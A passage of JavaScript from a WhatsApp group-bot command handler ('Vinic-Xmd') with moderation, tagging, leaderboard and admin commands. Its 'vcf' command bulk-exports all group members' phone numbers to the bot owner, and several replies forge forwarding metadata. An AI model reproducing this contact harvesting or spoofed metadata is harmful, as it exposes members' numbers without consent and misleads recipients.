    "https://cdn.ironman.my.id/i/smsl2s.mp4",
    "https://cdn.ironman.my.id/i/vkvh1d.mp4",
    "https://cdn.ironman.my.id/i/9xp5lb.mp4",
    "https://cdn.ironman.my.id/i/jfr6cu.mp4",
    "https://cdn.ironman.my.id/i/l4dyvg.mp4",
    "https://cdn.ironman.my.id/i/4z93dg.mp4",
    "https://cdn.ironman.my.id/i/m9gwk0.mp4",
    "https://cdn.ironman.my.id/i/gr1jjc.mp4",
    "https://cdn.ironman.my.id/i/lbr8of.mp4",
    "https://cdn.ironman.my.id/i/0z95mz.mp4",
    "https://cdn.ironman.my.id/i/rldpwy.mp4",
    "https://cdn.ironman.my.id/i/lz2z87.mp4",
    "https://cdn.ironman.my.id/i/gg5jct.mp4"
  ];

  const randomClip = voiceClips[Math.floor(Math.random() * voiceClips.length)];
  const mentionedUser = m.sender;

  // 🧷 Mention user with text first
  await conn.sendMessage(m.chat, {
    text: `@${mentionedUser.split('@')[0]}`,
    mentions: [mentionedUser]
  });

  // 🎙️ Send Voice Note with Audio Type and Waveform + ExternalAdReply
  await conn.sendMessage(m.chat, {
    audio: { url: randomClip },
    mimetype: 'audio/mp4',
    ptt: true,
    waveform: [99, 0, 99, 0, 99],
    contextInfo: {
      forwardingScore: 55555,
      isForwarded: true,
      externalAdReply: {
        title: "Vinic-Xmd",
        body: "𝐓𝝰̚𝐠͜͡𝗲 𝝪𝐨̚𝝻͜͡𝐫 𝐋𝝾̚𝝼͜͡𝗲 :🦚🍬⛱️🎗️💖",
        mediaType: 4,
        thumbnailUrl: "https://files.catbox.moe/ptpl5c.jpeg",
        sourceUrl: "https://Wa.me/+254734939236",
        showAdAttribution: true
      }
    },
    mentions: [mentionedUser]
  });
}
break
case "character": {
try {
        // Ensure the command is used in a group
        if (!isGroup) {
            return reply("This command can only be used in groups.");
        }

        // Extract the mentioned user
        const mentionedUser = m.message.extendedTextMessage?.contextInfo?.mentionedJid?.[0];
        if (!mentionedUser) {
            return reply("Please mention a user whose character you want to check.");
        }

        // Define character traits
        const userChar = [
            "Sigma",
            "Generous",
            "Grumpy",
            "Overconfident",
            "Obedient",
            "Good",
            "Simp",
            "Kind",
            "Patient",
            "Pervert",
            "Cool",
            "Helpful",
            "Brilliant",
            "Sexy",
            "Single",
            "Hot",
            "Gorgeous",
            "Cute",
        ];

        // Randomly select a character trait
        const userCharacterSelection =
            userChar[Math.floor(Math.random() * userChar.length)];

        // Message to send
        const message = `Character of @${mentionedUser.split("@")[0]} is *${userCharacterSelection}* 🔥⚡`;

        // Send the message with mentions
        await conn.sendMessage(from, {
            text: message,
            mentions: [mentionedUser],
        }, { quoted: m });

    } catch (e) {
        console.error("Error in character command:", e);
        reply("An error occurred while processing the command. Please try again.");
    }
}
//=====[GROUP MENU CMDS]======
break 
case "hidetag": case "h": {
if (!m.isGroup) return reply(mess.group)
if (!isAdmins && !Access) return reply(mess.admin)
if (!isBotAdmins) return reply(mess.botadmin)
let members = groupMembers.map(a => a.id)
conn.sendMessage(m.chat, {text : q ? q : 'Jexploit Is Always Here', mentions: members}, {quoted:m})
}
break
case "listactive": {
    if (!m.isGroup) return reply(mess.group);
    
    try {
        // Check if GroupDB.getActiveUsers function exists
        if (typeof GroupDB.getActiveUsers !== 'function') {
            throw new Error('GroupDB.getActiveUsers is not a function');
        }
        
        const activeUsers = await GroupDB.getActiveUsers(from);
        
        if (!activeUsers || !Array.isArray(activeUsers) || !activeUsers.length) {
            return reply('No active users found in this group.');
        }

        let message = `\n*Active Users in Group*\n\n`;
        message += activeUsers.map((user, i) =>
            `${i + 1}. @${user?.jid?.split('@')[0] || 'unknown'} - *${user?.count || 0} messages*`
        ).join('\n');

        conn.sendMessage(m.chat, {
            text: message,
            mentions: activeUsers.map(user => user.jid).filter(jid => jid)
        }, {quoted: m});
        
    } catch (error) {
        console.error('Error in listactive command:', error);
        reply('Error retrieving active users. Please try again later.');
    }
}
break
// Add companion command for top chatters
case "topchatters":
case "mostactive":
case "leaderboard": {
    if (!m.isGroup) return reply('❌ *This command only works in groups!*');

    try {
        // Send loading reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "⏳",
                key: m.key
            }
        });

        const groupMetadata = await conn.groupMetadata(m.chat);
        
        // Get message counts (similar to listactive)
        const groupMessages = store.messages && store.messages[m.chat] ? store.messages[m.chat] : [];
        const userMessageCounts = {};
        
        const recentMessages = Array.isArray(groupMessages) ? groupMessages.slice(-2000) : [];
        recentMessages.forEach(msg => {
            if (msg?.key && !msg.key.fromMe) {
                const userId = msg.key.participant || msg.key.remoteJid;
                if (userId) {
                    userMessageCounts[userId] = (userMessageCounts[userId] || 0) + 1;
                }
            }
        });

        // Get top 10 chatters
        const topChatters = Object.entries(userMessageCounts)
            .filter(([_, count]) => count > 0)
            .map(([userId, count]) => ({ userId, count }))
            .sort((a, b) => b.count - a.count)
            .slice(0, 10);

        if (topChatters.length === 0) {
            await conn.sendMessage(m.chat, {
                react: {
                    text: "ℹ️",
                    key: m.key
                }
            });
            return reply('ℹ️ *No message activity found!* The group might be quiet.');
        }

        let leaderboard = `🏆 *TOP CHATTERS LEADERBOARD*\n\n`;
        leaderboard += `*Group:* ${groupMetadata.subject}\n`;
        leaderboard += `*Based on:* Last ${recentMessages.length} messages\n\n`;

        // Add emojis for top 3 positions
        const positionEmojis = ['🥇', '🥈', '🥉', '4️⃣', '5️⃣', '6️⃣', '7️⃣', '8️⃣', '9️⃣', '🔟'];
        
        topChatters.forEach((user, index) => {
            const username = user.userId.split('@')[0];
            const emoji = positionEmojis[index] || `${index + 1}.`;
            
            leaderboard += `${emoji} @${username}\n`;
            leaderboard += `   💬 Messages: ${user.count}\n\n`;
        });

        // Success reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "✅",
                key: m.key
            }
        });

        // Send leaderboard
        const mentionJids = topChatters.map(user => user.userId);
        reply(leaderboard, { mentions: mentionJids });

    } catch (error) {
        console.error('Error in topchatters command:', error);
        
        // Error reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "❌",
                key: m.key
            }
        });
        
        reply('❌ *Failed to generate leaderboard.* Please try again.');
    }
    
}
break
case "listinactive": {
    if (!m.isGroup) return reply(mess.group);
    
    try {
        // Get group metadata safely
        const groupMetadata = isGroup ? await conn.groupMetadata(m.chat).catch(() => null) : null;
        if (!groupMetadata) return reply('*Could not retrieve group information.*');

        const participants = groupMetadata.participants || [];
        if (participants.length === 0) return reply('*No members found in this group.*');

        // Get message store for this group
        const groupMessages = store.messages && store.messages[m.chat] ? store.messages[m.chat] : [];
        
        // Calculate inactivity period (default: 7 days)
        const inactivityDays = parseInt(args[0]) || 7;
        const inactivityThreshold = Date.now() - (inactivityDays * 24 * 60 * 60 * 1000);
        
        // Track last activity for each user
        const userLastActivity = {};
        
        // Analyze recent messages (last 1000 messages max for performance)
        const recentMessages = Array.isArray(groupMessages) ? groupMessages.slice(-1000) : [];
        
        recentMessages.forEach(msg => {
            if (msg?.key && !msg.key.fromMe) {
                const userId = msg.key.participant || msg.key.remoteJid;
                const messageTime = msg.messageTimestamp ? msg.messageTimestamp * 1000 : Date.now();
                
                if (userId && messageTime) {
                    // Update last activity if this message is newer
                    if (!userLastActivity[userId] || messageTime > userLastActivity[userId]) {
                        userLastActivity[userId] = messageTime;
                    }
                }
            }
        });

        // Identify inactive users
        const inactiveUsers = [];
        
        participants.forEach(participant => {
            const userId = participant.id;
            const lastActive = userLastActivity[userId] || 0;
            const daysInactive = Math.floor((Date.now() - lastActive) / (24 * 60 * 60 * 1000));
            
            // Consider user inactive if no activity found or beyond threshold
            if (lastActive === 0 || lastActive < inactivityThreshold) {
                inactiveUsers.push({
                    jid: userId,
                    lastActive: lastActive,
                    daysInactive: daysInactive,
                    isAdmin: participant.admin || false
                });
            }
        });

        // Sort by most inactive first
        inactiveUsers.sort((a, b) => a.lastActive - b.lastActive);

        if (inactiveUsers.length === 0) {
            return reply(`*No inactive members found in this group (based on ${inactivityDays} day threshold).*`);
        }

        // Format inactive users list
        let inactiveList = `📋 *INACTIVE MEMBERS LIST* 📋\n\n`;
        inactiveList += `*Inactivity Threshold:* ${inactivityDays} day(s)\n`;
        inactiveList += `*Total Inactive Members:* ${inactiveUsers.length}\n\n`;
        
        inactiveList += inactiveUsers.map((user, index) => {
            const username = user.jid.split('@')[0];
            const lastActiveDate = user.lastActive ? new Date(user.lastActive).toLocaleDateString() : 'Never active';
            const role = user.isAdmin ? '👑 Admin' : '👤 Member';
            
            return `${index + 1}. @${username}\n   📅 Last active: ${lastActiveDate}\n   ⏰ Days inactive: ${user.daysInactive}\n   ${role}\n`;
        }).join('\n');

        // Add summary
        inactiveList += `\n💡 *Tip:* Use \`${prefix}listinactive 30\` to check for members inactive for 30 days`;

        // Get all JIDs for mentions
        const mentionJids = inactiveUsers.map(user => user.jid);

        await conn.sendMessage(
            m.chat,
            {
                text: inactiveList,
                mentions: mentionJids
            },
            { quoted: m }
        );

    } catch (error) {
        console.error('Error in listinactive command:', error);
        reply('*An error occurred while checking inactive members. Please try again.*');
    }
    
}
break
case "kickall": {
    if (!m.isGroup) return reply(mess.group);
    if (!isAdmins && !isCreator) return reply(mess.admin);
    if (!isBotAdmins) return reply(mess.botAdmin);
    
    try {
        // Get group metadata
        const groupMetadata = await conn.groupMetadata(m.chat).catch(() => null);
        if (!groupMetadata) return reply('*Could not retrieve group information.*');
        
        const participants = groupMetadata.participants || [];
        if (participants.length === 0) return reply('*No members found in this group.*');
        
        // Safety confirmation - require confirmation for kickall
        if (args[0] !== 'confirm') {
            return reply(`⚠️ *DANGEROUS COMMAND* ⚠️\n\nThis will remove ALL members from the group except admins.\n\nIf you're sure, type: *${prefix}kickall confirm*`);
        }
        
        // Get list of members to kick (non-admins only)
        const membersToRemove = participants
            .filter(p => !p.admin) // Keep admins
            .map(p => p.id)
            .filter(id => id !== botNumber); // Don't kick the bot
        
        if (membersToRemove.length === 0) {
            return reply('*No non-admin members found to remove.*');
        }
        
        // Send warning message
        await reply(`🚨 *MASS REMOVAL INITIATED* 🚨\n\nRemoving *${membersToRemove.length}* members from the group...\nThis may take a while.`);
        
        let successCount = 0;
        let failCount = 0;
        const failedMembers = [];
        
        // Remove members in batches to avoid rate limiting
        for (let i = 0; i < membersToRemove.length; i++) {
            const member = membersToRemove[i];
            
            try {
                await conn.groupParticipantsUpdate(m.chat, [member], 'remove');
                successCount++;
                
                // Add small delay between kicks to avoid rate limiting
                if (i % 5 === 0 && i > 0) {
                    await sleep(2000); // 2 second delay every 5 members
                }
            } catch (error) {
                failCount++;
                failedMembers.push(member);
                console.error(`Failed to remove ${member}:`, error);
            }
        }
        
        // Prepare result message
        let resultMessage = `✅ *MASS REMOVAL COMPLETE* ✅\n\n`;
        resultMessage += `*Successfully removed:* ${successCount} members\n`;
        resultMessage += `*Failed to remove:* ${failCount} members\n`;
        
        if (failCount > 0) {
            resultMessage += `\n❌ *Failed Members:*\n`;
            resultMessage += failedMembers.map((member, index) => 
                `${index + 1}. @${member.split('@')[0]}`
            ).join('\n');
            
            resultMessage += `\n\n*Note:* Some members might be admins or have privacy settings that prevent removal.`;
        }
        
        resultMessage += `\n\n*Group now has:* ${participants.length - successCount} members`;
        
        // Send result with mentions for failed members
        await conn.sendMessage(
            m.chat,
            {
                text: resultMessage,
                mentions: failedMembers
            },
            { quoted: m }
        );
        
    } catch (error) {
        console.error('Error in kickall command:', error);
        reply('*A critical error occurred during mass removal. Operation cancelled.*');
    }
    
}
break
case "tagall": {
    if (!m.isGroup) return reply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin);
    if (!isBotAdmins) return reply(mess.admin);

    let me = m.sender;
    let q = m.text.split(' ').slice(1).join(' ').trim(); // Extract the message after the command
    let teks = `*TAGGED BY:* @${me.split("@")[0]}\n\n*MESSAGE:* ${q || "No message"}\n\n`;
    
    for (let mem of participants) {
        teks += `@${mem.id.split("@")[0]}\n`;
    }
    
    conn.sendMessage(
        m.chat,
        {
            text: teks,
            mentions: participants.map((a) => a.id),
        },
        {
            quoted: m,
        }
    );
}
break
case "close": {
  if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isCreator) return reply(mess.notadmin);
        if (!isBotAdmins) return reply(mess.admin);

        conn.groupSettingUpdate(m.chat, "announcement");
        reply("Group closed by admin. Only admins can send messages.");
}
break
case "delgrouppp": {
        if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isCreator) return reply(mess.notadmin);
        if (!isBotAdmins) return reply(mess.admin);
        
        await conn.removeProfilePicture(from);
        reply("Group profile picture has been successfully removed.");
}
break
case "setdesc": {
        if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.notadmin);
        if (!isBotAdmins) return reply(mess.admin);
        if (!text) return reply("*Please enter a text*");
        
        await conn.groupUpdateDescription(m.chat, text);
        reply(mess.done);
}
break
case "vcf": {
try {
        if (!isGroup) return reply("This command is for groups only.");
        if (!Access) return reply("*_This command is for the owner only_*");

        let card = quoted || m; // Handle if quoted message exists
        let cmiggc = groupMetadata;
        const { participants } = groupMetadata;
        
        let orgiggc = participants.map(a => a.id);
        let vcard = '';
        let noPort = 0;
        
        for (let a of cmiggc.participants) {
            vcard += `BEGIN:VCARD\nVERSION:3.0\nFN:[${noPort++}] +${a.id.split("@")[0]}\nTEL;type=CELL;type=VOICE;waid=${a.id.split("@")[0]}:+${a.id.split("@")[0]}\nEND:VCARD\n`;
        }

        let nmfilect = './contacts.vcf';
        reply('Saving ' + cmiggc.participants.length + ' participants contact');

        fs.writeFileSync(nmfilect, vcard.trim());
        await sleep(2000);

        await conn.sendMessage(from, {
            document: fs.readFileSync(nmfilect), 
            mimetype: 'text/vcard', 
            fileName: 'trend-x.vcf', 
            caption: `\nDone saving.\nGroup Name: *${cmiggc.subject}*\nContacts: *${cmiggc.participants.length}*\n> Powered by Vinic-Xmd `}, { quoted: mek });

        fs.unlinkSync(nmfilect); // Cleanup the file after sending
    } catch (err) {
        reply(err.toString());
    }
}
break
        case 'setppgroup': {
if (!isGroup) return reply('Only Group')
if (!isAdmins) return reply('*Only Admin*')
if (!isBotAdmins) return reply('make bot an admin in this group first idiot')
if (!quoted) return reply(`*Where is the picture?*`)
if (!/image/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (/webp/.test(mime)) return reply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
var mediz = await conn.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
var { img } = await generateProfilePicture(mediz)
await conn.query({
tag: 'iq',
attrs: {
to: m.chat,
type:'set',
xmlns: 'w:profile:picture'
},
content: [
{
tag: 'picture',
attrs: { type: 'image' },
content: img
}
]
})
fs.unlinkSync(mediz)
reply(`*Success Beb✅*`)
} else {
var memeg = await conn.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
reply(`*Success Beb✅*`)
}
}
break
case 'approve': case 'approve-all': {
	if (!m.isGroup) return reply(mess.group)
if (!isAdmins) return m.reply(mess.group)
if (!isBotAdmins) return reply("*first make Vinic-Xmd admin to operate this feature*")

const responseList = await conn.groupRequestParticipantsList(m.chat);

if (responseList.length === 0) return reply("*No pending requests detected at the moment!*");

for (const participan of responseList) {
    const response = await conn.groupRequestParticipantsUpdate(
        m.chat, 
        [participan.jid], // Approve/reject each participant individually
        "approve" // or "reject"
    );
    console.log(response);
}
reply("*Vinic-Xmd has approved all pending requests✅*");

}
break
case " disapproveall": {
    if (!m.isGroup) return reply(mess.group);
    if (!isGroupAdmins) return reply(mess.admin);
    if (!isBotAdmins) return reply(mess.admin);
        
    const groupId = m.chat;
 
   await disapproveAllRequests(m, groupId);
}
break
case "listrequest": {
if (!m.isGroup) return reply(mess.group);
    if (!isGroupAdmins) return reply(mess.admin);
    if (!isBotAdmins) return reply(mess.admin);
        
    const groupId = m.chat; 

    await listGroupRequests(m, groupId);
}
break
case "disappear": {
    try {
        if (!m.isGroup) return reply("❌ This command only works in groups");
        if (!isAdmins) return reply("❌ Only admins can change disappearing messages");

        const action = args[0]?.toLowerCase();
        
        if (action === 'on') {
            const duration = args[1]?.toLowerCase();
            let seconds;
            
            switch (duration) {
                case "24h": seconds = 86400; break;
                case "7d": seconds = 604800; break;
                case "90d": seconds = 7776000; break;
                default: 
                    return reply("❌ Invalid duration! Use 24h, 7d, or 90d");
            }

            await conn.groupSettingUpdate(m.chat, 'disappearing_messages', seconds);
            reply(`✅ Disappearing messages enabled for ${duration}`, {
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true
                }
            });
            
        } else if (action === 'off') {
            await conn.groupSettingUpdate(m.chat, 'disappearing_messages', false);
            reply("✅ Disappearing messages disabled", {
                contextInfo: {
                    forwardingScore: 999,
                    isForwarded: true
                }
            });
            
        } else {
            reply("ℹ️ Usage: .disappear <on/off> [24h/7d/90d]");
        }
    } catch (error) {
        console.error("Disappear Error:", error);
        reply("❌ Failed to update disappearing messages");
    }
    
}
break
case "promote":
case "admin":
case "makeadmin": {
    if (!m.isGroup) return reply('❌ *This command only works in groups!*');
    if (!isAdmins && !Access) return reply(mess.admin);
    if (!isBotAdmins) return reply(mess.botAdmin);

    let target = m.mentionedJid[0] 
        ? m.mentionedJid[0] 
        : m.quoted 
        ? m.quoted.sender 
        : text.replace(/\D/g, "") 
        ? text.replace(/\D/g, "") + "@s.whatsapp.net" 
        : null;

    if (!target) return reply(`❌ *Please mention or reply to a user!*\n\n*Usage:* ${prefix}promote @user\n*Example:* ${prefix}promote @${m.sender.split('@')[0]}`);

    try {
        // Send loading reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "⏳",
                key: m.key
            }
        });

        // Check if target is already admin
        const groupMetadata = await conn.groupMetadata(m.chat);
        const participants = groupMetadata.participants;
        const targetParticipant = participants.find(p => p.id === target);
        
        if (!targetParticipant) {
            await conn.sendMessage(m.chat, {
                react: {
                    text: "❌",
                    key: m.key
                }
            });
            return reply('❌ *User not found in this group!*');
        }

        if (targetParticipant.admin) {
            await conn.sendMessage(m.chat, {
                react: {
                    text: "ℹ️",
                    key: m.key
                }
            });
            return reply(`ℹ️ *@${target.split('@')[0]} is already an admin!*`, {
                mentions: [target]
            });
        }

        // Promote the user
        await conn.groupParticipantsUpdate(m.chat, [target], "promote");

        // Success reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "✅",
                key: m.key
            }
        });

        // Get user info for the message
        const userPushName = await conn.getName(target).catch(() => target.split('@')[0]);
        
        reply(`🎉 *ADMIN PROMOTION*\n\n✅ *@${target.split('@')[0]} has been promoted to admin!*\n\n*User:* ${userPushName}\n*Promoted by:* @${m.sender.split('@')[0]}\n*Group:* ${groupMetadata.subject}`, {
            mentions: [target, m.sender]
        });

        // Optional: Send notification to the promoted user
        try {
            await conn.sendMessage(target, {
                text: `🎉 *You've been promoted to admin!*\n\n*Group:* ${groupMetadata.subject}\n*Promoted by:* @${m.sender.split('@')[0]}\n\nCongratulations! 🎊`,
                mentions: [m.sender]
            });
        } catch (notifyError) {
            console.log('Could not send promotion notification to user');
        }

    } catch (error) {
        console.error('Error promoting user:', error);
        
        // Error reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "❌",
                key: m.key
            }
        });

        if (error.message.includes('not authorized')) {
            reply('❌ *I need to be admin to promote users!*');
        } else if (error.message.includes('401')) {
            reply('❌ *I need to be admin to promote users!*');
        } else if (error.message.includes('404')) {
            reply('❌ *User not found in this group!*');
        } else if (error.message.includes('500')) {
            reply('❌ *Cannot promote the group owner!*');
        } else {
            reply('❌ *Failed to promote user.* Please try again.');
        }
    }
    
}
break
case "demote":
case "removeadmin":
case "revokeadmin": {
    if (!m.isGroup) return reply('❌ *This command only works in groups!*');
    if (!isAdmins && !Access) return reply(mess.admin);
    if (!isBotAdmins) return reply(mess.botAdmin);

    let target = m.mentionedJid[0] 
        ? m.mentionedJid[0] 
        : m.quoted 
        ? m.quoted.sender 
        : text.replace(/\D/g, "") 
        ? text.replace(/\D/g, "") + "@s.whatsapp.net" 
        : null;

    if (!target) return reply(`❌ *Please mention or reply to a user!*\n\n*Usage:* ${prefix}demote @user\n*Example:* ${prefix}demote @${m.sender.split('@')[0]}`);

    try {
        // Send loading reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "⏳",
                key: m.key
            }
        });

        // Check if target is admin
        const groupMetadata = await conn.groupMetadata(m.chat);
        const participants = groupMetadata.participants;
        const targetParticipant = participants.find(p => p.id === target);
        
        if (!targetParticipant) {
            await conn.sendMessage(m.chat, {
                react: {
                    text: "❌",
                    key: m.key
                }
            });
            return reply('❌ *User not found in this group!*');
        }

        if (!targetParticipant.admin) {
            await conn.sendMessage(m.chat, {
                react: {
                    text: "ℹ️",
                    key: m.key
                }
            });
            return reply(`ℹ️ *@${target.split('@')[0]} is not an admin!*`, {
                mentions: [target]
            });
        }

        // Check if trying to demote group owner
        if (targetParticipant.admin === 'superadmin') {
            await conn.sendMessage(m.chat, {
                react: {
                    text: "❌",
                    key: m.key
                }
            });
            return reply('❌ *Cannot demote the group owner!*');
        }

        // Demote the user
        await conn.groupParticipantsUpdate(m.chat, [target], "demote");

        // Success reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "✅",
                key: m.key
            }
        });

        // Get user info for the message
        const userPushName = await conn.getName(target).catch(() => target.split('@')[0]);
        
        reply(`🔻 *ADMIN DEMOTION*\n\n✅ *@${target.split('@')[0]} has been demoted from admin!*\n\n*User:* ${userPushName}\n*Demoted by:* @${m.sender.split('@')[0]}\n*Group:* ${groupMetadata.subject}`, {
            mentions: [target, m.sender]
        });

    } catch (error) {
        console.error('Error demoting user:', error);
        
        // Error reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "❌",
                key: m.key
            }
        });

        if (error.message.includes('not authorized')) {
            reply('❌ *I need to be admin to demote users!*');
        } else if (error.message.includes('401')) {
            reply('❌ *I need to be admin to demote users!*');
        } else if (error.message.includes('404')) {
            reply('❌ *User not found in this group!*');
        } else if (error.message.includes('500')) {
            reply('❌ *Cannot demote the group owner!*');
        } else {
            reply('❌ *Failed to demote user.* Please try again.');
        }
    }
    
}
break
// Add admin list command
case "admins":
case "listadmins":
case "adminlist": {
    if (!m.isGroup) return reply('❌ *This command only works in groups!*');

    try {
        // Send loading reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "⏳",
                key: m.key
            }
        });

        const groupMetadata = await conn.groupMetadata(m.chat);
        const participants = groupMetadata.participants;
        
        const admins = participants.filter(p => p.admin);
        const superAdmin = participants.find(p => p.admin === 'superadmin');
        const regularAdmins = participants.filter(p => p.admin && p.admin !== 'superadmin');

        if (admins.length === 0) {
            await conn.sendMessage(m.chat, {
                react: {
                    text: "ℹ️",
                    key: m.key
                }
            });
            return reply('ℹ️ *No admins found in this group!*');
        }

        let adminList = `👑 *GROUP ADMINS LIST*\n\n`;
        adminList += `*Group:* ${groupMetadata.subject}\n`;
        adminList += `*Total Admins:* ${admins.length}\n\n`;

        // Add group owner first
        if (superAdmin) {
            adminList += `🤴 *GROUP OWNER*\n`;
            adminList += `• @${superAdmin.id.split('@')[0]}\n\n`;
        }

        // Add other admins
        if (regularAdmins.length > 0) {
            adminList += `👮 *ADMINS* (${regularAdmins.length})\n`;
            regularAdmins.forEach((admin, index) => {
                adminList += `${index + 1}. @${admin.id.split('@')[0]}\n`;
            });
        }

        // Success reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "✅",
                key: m.key
            }
        });

        // Send admin list with mentions
        const mentionJids = admins.map(admin => admin.id);
        reply(adminList, { mentions: mentionJids });

    } catch (error) {
        console.error('Error listing admins:', error);
        
        // Error reaction
        await conn.sendMessage(m.chat, {
            react: {
                text: "❌",
                key: m.key
            }
        });
        
        reply('❌ *Failed to get admin list.* Please try again.');
    }
    
}
break
case " getgrouppp": {
if (!m.isGroup) return reply(mess.group);

    try {
      const ppUrl = await conn.profilePictureUrl(m.chat, 'image');

      await conn.sendMessage(m.chat, 
        { 
          image: { url: ppUrl }, 
          caption: `🔹 *This Group's Profile Picture*`
        }, 
        { quoted: m }
      );
    } catch {
      await conn.sendMessage(m.chat, 
        { 
          image: { url: 'https://cdn.pixabay.com/photo/2015/10/05/22/37/blank-profile-picture-973460_960_720.png?q=60' }, 
          caption: '⚠️ No profile picture found for this group.'
        }, 
        { quoted: m }
      );
    }
}

break
case "online":
case "listonline": {
    if (!m.isGroup) return reply(mess.group);
    
    try {
        let id = args[0] && /\d+\-\d+@g.us/.test(args[0]) ? args[0] : m.chat;
        
        // Safely check if presences exist
        let presences = store.presences && store.presences[id] ? store.presences[id] : null;
        
        if (!presences || Object.keys(presences).length === 0) {
            return reply('*No online members detected in this group.*');
        }

        // Safely get online members
        let onlineMembers = [];
        try {
            onlineMembers = [...Object.keys(presences), botNumber];
        } catch (e) {
            console.error('Error getting online members:', e);
            return reply('*Error detecting online members.*');
        }

        // Filter out invalid entries and ensure they're valid JIDs
        const validOnlineMembers = onlineMembers.filter(member => 
            member && typeof member === 'string' && member.includes('@')
        );

        if (validOnlineMembers.length === 0) {
            return reply('*No online members detected in this group.*');
        }

        let liston = 1;
        const onlineListText = '*ONLINE MEMBERS IN THIS GROUP*\n\n' + 
            validOnlineMembers.map(v => {
                const username = v.replace(/@.+/, '');
                return `${liston++}. @${username}`;
            }).join('\n');

        // Send message with mentions
        await conn.sendMessage(
            m.chat,
            {
                text: onlineListText,
                mentions: validOnlineMembers
            },
            { quoted: m }
        );
        
    } catch (error) {
        console.error('Error in listonline command:', error);
        reply('*An error occurred while checking online members.*');
    }
    
}
break
case "editinfo": {
if (!m.isGroup) return reply(mess.group);
        if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin);
        if (!isBotAdmins) return reply(mess.admin);

        if (args[0] === "on") {
            await conn.groupSettingUpdate(m.chat, "unlocked").then(
                (res) => reply(`*Successful, members can edit group info*`)
            );
        } else if (args[0] === "off") {
            await conn.groupSettingUpdate(m.chat, "locked").then((res) =>
                reply(`*Successful, members cannot edit group info*`)
            );
        } else {
            reply(`Example ${prefix + command} on/off`);
        }
}
break
case "invite": {
if (!m.isGroup) return reply(mess.group);
        if (!isBotAdmins) return reply(mess.admin);
        if (!text)
            return reply(
                `*Enter the number you want to invite to this group*\n\nExample :\n${prefix + command} 256742932677`
            );
        if (text.includes("+"))
            return reply(`*Enter the number together without* *+*`);
        if (isNaN(text))
            return reply(
                `*Enter only the numbers with your country code without spaces*`
            );

        let group = m.chat;
        let link = "https://chat.whatsapp.com/" + (await conn.groupInviteCode(group));
        await conn.sendMessage(text + "@s.whatsapp.net", {
            text: `*GROUP INVITATION*\n\nSomeone invites you to join this group: \n\n${link}`,
            mentions: [m.sender],
        });
        reply(`*Successfully sent invite link*`);
}
break
case "linkgc": {
if (!m.isGroup) return reply(mess.group);
    if (!isAdmins && !isGroupOwner && !isCreator) return reply(mess.admin);
    if (!isBotAdmins) return reply(mess.admin);

    let response = await conn.groupInviteCode(m.chat);
    conn.sendText(
      m.chat,
      `*GROUP LINK*\n\n*NAME:* ${groupMetadata.subject}\n\n*OWNER:* ${groupMetadata.owner !== undefined ? "+" + groupMetadata.owner.split`@`[0] : "Unknown"}\n\n*ID:* ${groupMetadata.id}\n\n*LINK:* https://chat.whatsapp.com/${response}\n\n*MEMBERS:* ${groupMetadata.participants.length}`,
      m,
      {
        detectLink: true,
      }
    );
}
break
case "'unlockgc'": {
try {
        if (!isGroup) return reply("❌ This command can only be used in groups");
        if (!isAdmins) return reply("❌ Only admins can unlock settings");
        if (!isBotAdmins) return reply("❌ Bot needs admin privileges");

        await conn.groupSettingUpdate(from, "unlocked");
        reply("🔓 Group settings are now unlocked", {
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        });

    } catch (error) {
        console.error("UnlockGS Error:", error);
        reply("❌ Failed to unlock group settings");
    }
}
break
case "lockgc": {
try {
        if (!isGroup) return reply("❌ This command can only be used in groups");
        if (!isAdmins) return reply("❌ Only admins can lock settings");
        if (!isBotAdmins) return reply("❌ Bot needs admin privileges");

        await conn.groupSettingUpdate(from, 'locked');
        reply("🔒 Group settings are now locked (admins only)", {
            contextInfo: {
                forwardingScore: 999,
                isForwarded: true
            }
        });

    } catch (error) {
        console.error("LockGS Error:", error);
        reply("❌ Failed to lock group settings");
    }
}
break
case "closetime": {
    if (!m.isGroup) return reply(mess.group);
    if (!isAdmins && !isCreator) return reply(mess.notadmin);
    if (!isBotAdmins) return reply(mess.admin);

    // Check if both arguments are provided
    if (!args[0] || !args[1]) {
        return reply("*Usage:*\n.closetime [duration] [unit]\n\n*Select unit:*\nseconds\nminutes\nhours\ndays\n\n*Example:*\n10 seconds");
    }

    const duration = args[0];
    const unit = args[1].toLowerCase();

    let timer;
    switch (unit) {
        case "seconds":
            timer = duration * 1000;
            break;
        case "minutes":
            timer = duration * 60000;
            break;
        case "hours":
            timer = duration * 3600000;
            break;
        case "days":
            timer = duration * 86400000;
            break;
        default:
            return reply("*Select unit:*\nseconds\nminutes\nhours\ndays\n\n*Example:*\n10 seconds");
    }

    reply(`*Closing group after ${duration} ${unit}*`);
    setTimeout(() => {
        conn.groupSettingUpdate(m.chat, "announcement");
        reply("*Group closed by admin. Only admins can send messages.*");
    }, timer);
}
break
case "opentime": {
    if (!m.isGroup) return reply(mess.group);
    if (!isAdmins && !isCreator) return reply(mess.notadmin);
    if (!isBotAdmins) return reply(mess.admin);

    const duration = args[0];
    if (!args[1] || typeof args[1] !== 'string') return reply("*Select unit:*\nseconds\nminutes\nhours\ndays\n\n*Example:*\n10 seconds");
    const unit = args[1].toLowerCase();

    let timer;
    switch (unit) {
